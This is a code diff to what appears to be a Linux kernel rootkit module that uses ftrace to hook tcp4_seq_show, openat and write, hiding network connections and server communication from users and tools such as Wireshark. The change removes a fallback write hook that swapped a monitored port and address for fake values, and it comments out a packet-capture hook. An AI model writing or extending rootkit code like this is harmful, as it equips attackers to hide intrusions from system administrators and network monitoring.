@@ -17,9 +17,6 @@
 #include <linux/dirent.h>
 #include <linux/tcp.h>
 
-#include <linux/mfd/ezx-pcap.h>
-#include <linux/spi/spi.h>
-#include <linux/platform_device.h>
 #include <linux/string.h>
 
 #include <net/tcp.h>
@@ -228,7 +225,6 @@ static asmlinkage int hook_openat(int dirfd, const char __user *pathname, int fl
 /* Hook the write function to prevent communication with server from
  * from being output to stdout. */
 #define HTTP_ALT "http-alt"
-#ifdef PTREGS_SYSCALL_STUBS
 static asmlinkage long (*orig_write)(struct pt_regs *regs);
 
 static asmlinkage long hook_write(struct pt_regs *regs) {
@@ -251,21 +247,6 @@ static asmlinkage long hook_write(struct pt_regs *regs) {
 
   return orig_write(regs);
 }
-#else
-static asmlinkage long (*orig_write)(struct pt_regs *regs);
-
-static asmlinkage long hook_write(int fd, const char __user *buff, size_t count) {
-  char *fake_port = "2020";
-  char *fake_address = "123.456.789.0";
-  if (strstr(buff, bad_port) != NULL) {
-    return orig_write(fd, fake_port, count);
-  } else if (strstr(buff, bad_address) != NULL) {
-    return orig_write(fd, fake_address, count);
-  }
-
-  return orig_write(fd, buff, count);
-}
-#endif
 
 /* Tries to prevent wireshark from using pcap. Wireshark uses libpcap to library
  * to perform pcap. This hook aims to interrupt packet processing by causing
@@ -290,7 +271,7 @@ static struct ftrace_hook hooks[] = {
   HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
   HOOK("__x64_sys_openat", hook_openat, &orig_openat),
   HOOK("__x64_sys_write", hook_write, &orig_write),
-  HOOK("ezx_pcap_putget", hook_ezx_pcap_putget, &orig_ezx_pcap_putget),
+  //HOOK("ezx_pcap_putget", hook_ezx_pcap_putget, &orig_ezx_pcap_putget),
 };
 
 
